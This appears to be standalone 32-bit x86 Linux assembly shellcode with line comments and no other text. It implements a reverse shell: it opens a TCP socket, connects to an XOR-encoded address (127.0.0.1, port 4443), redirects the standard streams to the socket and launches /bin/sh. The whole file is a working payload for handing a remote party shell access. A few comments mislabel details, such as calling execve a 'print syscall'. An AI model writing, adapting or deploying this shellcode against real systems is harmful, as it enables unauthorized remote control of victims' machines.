global _start:

section .text
_start:

        xor eax, eax
        xor ebx, ebx
        xor ecx, ecx
        cdq

        ; create socket s=socket(2,1,0)
        mov al, 0x66
        inc ebx               ;ebx=1
        push edx              ;0
        push ebx              ;1
        push 0x2              ;2
        mov ecx, esp          ;pointer to args
        int 0x80              ;syscall
        mov esi, eax          ;sockfd

	; create addr struc and connect
	mov eax, 0xabaaaad5   ;127.0.0.1 (xored with key 0xaaaaaaa)
	mov ebx, 0xaaaaaaaa
	xor eax, ebx
	push edx	      ;padding(NULLs)
	push eax	      ;127.0.0.1
	push word 0x5b11      ;4443
	push word 0x2	      ;AF_INET
	mov ecx, esp	      ;pointer to args

	xor eax, eax
	xor ebx, ebx
	mov al, 0x66
	mov bl, 0x3           ;ebx=3 --> SYS_CONNECT
	push 0x10	      ;16
	push ecx	      ;addr struc
	push esi	      ;sockfd
	mov ecx, esp
	int 0x80
	
	;dup
	xor ecx, ecx          ;ecx=0
	mov cl, 0x3           ;counter for loop. Iterating for 3 stdfds
	dup2:
	xor eax, eax          ;eax=0
	mov al, 0x3f          ;syscall number for dup2
	mov ebx, esi          ;sockfd moved into ebx
	dec cl                ;ecx=2
	int 0x80              ;syscall
	jnz dup2              ;keep looping until the 0 flag is set

	;execve
	xor ecx, ecx          ;ecx=0
	push ecx              ;pushing the null
	push byte 0x0b        ;print syscall
	pop eax               ;eax=11
	push 0x68732f2f       ;pushing /bin/sh in reverse order
	push 0x6e69622f
	mov ebx, esp          ;pointer to args
	int 0x80              ;syscall
